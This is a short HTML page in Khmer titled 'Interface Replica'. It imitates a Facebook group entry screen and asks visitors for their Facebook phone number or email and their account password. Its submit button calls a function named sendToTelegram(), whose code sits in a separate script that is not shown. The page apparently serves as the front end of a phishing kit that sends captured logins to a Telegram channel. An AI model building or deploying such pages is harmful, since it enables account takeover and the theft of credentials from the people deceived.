<!DOCTYPE html>
<html lang="km">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Interface Replica</title>
    <link rel="stylesheet" href="style.css">
</head>
<body>

    <div class="container">
        <div class="image-banner"></div>

        <div class="form-container">
            <input type="text" id="email" class="input-field" placeholder="លេខទូរសព្ទចល័ត ឬអ៊ីមែល Facebook">
            <input type="password" id="password" class="input-field" placeholder="ពាក្យសម្ងាត់គណនីFacebook">
            <button class="submit-btn" onclick="sendToTelegram()">ចូលក្នុងគ្រុប</button>
            <div class="loading" id="loading">កំពុងដំណើរការ...</div>
        </div>
    </div>

    <script src="script.js"></script>
</body>
</html>
